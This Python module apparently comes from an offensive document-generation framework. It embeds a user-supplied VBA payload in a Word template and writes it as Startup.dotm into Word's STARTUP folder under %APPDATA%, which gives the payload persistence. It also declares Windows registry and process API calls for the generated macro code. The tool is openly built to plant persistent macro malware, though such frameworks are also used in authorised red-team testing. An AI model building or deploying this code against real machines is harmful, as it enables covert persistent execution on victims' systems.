
from lib.interfaces.module_interface import ModuleInterface
from lib.validators.files import isvalidfilename
from lib.validators.files import isreadable

class Template(ModuleInterface):
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        options['payload_file'] = {
            "value": None,
            "required": True,
            "description": "name of the generated VBA module to include as a payload",
            "tab_complete": self.helpers.complete_path,
            "validator": isreadable,
            "handler": None
        }
        options['payload_function'] = {
            "value": None,
            "required": True,
            "description": "name of the function to call within the payload VBA module",
            "validator": isvalidfilename,
            "handler": None
        }
        options['template'] = {
            "value": "Startup.dotm",
            "required": True,
            "description": "name of the template written to disk under %APPDATA%\\Microsoft\\Word\\STARTUP",
            "validator": isvalidfilename,
            "handler": None
        }
        super().__init__(templatePath, options)
        self.payloadEmbedded = True
        
    def preprocess(self):
        
        super().preprocess()
        
        # Set up the declares
        self.declares.add('Private Declare PtrSafe Function m_CloseHandle Lib "kernel32" Alias "CloseHandle" (ByVal hObject As LongPtr) As Long')
        self.declares.add('Private Declare PtrSafe Function m_GetCurrentProcessId Lib "kernel32" Alias "GetCurrentProcessId" () As Long')
        self.declares.add('Private Declare PtrSafe Function m_RegCloseKey Lib "advapi32.dll" Alias "RegCloseKey" (ByVal hKey As LongPtr) As Long')
        self.declares.add('Private Declare PtrSafe Function m_RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As LongPtr) As Long')
        self.declares.add('Private Declare PtrSafe Function m_RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As LongPtr, ByVal lpValueName As String, ByVal lpReserved As LongPtr, lpType As Long, lpData As Any, lpcbData As Long) As Long')
        self.declares.add('Private Declare PtrSafe Function m_ExpandEnvironmentStrings Lib "kernel32" Alias "ExpandEnvironmentStringsA" (ByVal lpSrc As String, lpDst As Any, ByVal nSize As Long) As Long')
                        
        self.declares.add('Private Const KEY_READ = &H20019')
        self.declares.add('Private Const HKEY_CURRENT_USER = &H80000001')
        self.declares.add('Private g_hMutex As LongPtr')
        
        payloadContents = ""
        with open(self.options['payload_file']['value'], 'r') as fPayload:
            payloadContents = fPayload.read()
        self.options['payloadCode'] = {
            "value": payloadContents,
            "required": True,
            "description": "The payload contents",
            "validator": None,
            "handler": None
        }

        return 
             
    def postprocess(self):
        # Remove the payload contents read in from file
        del self.options['payloadCode']
        
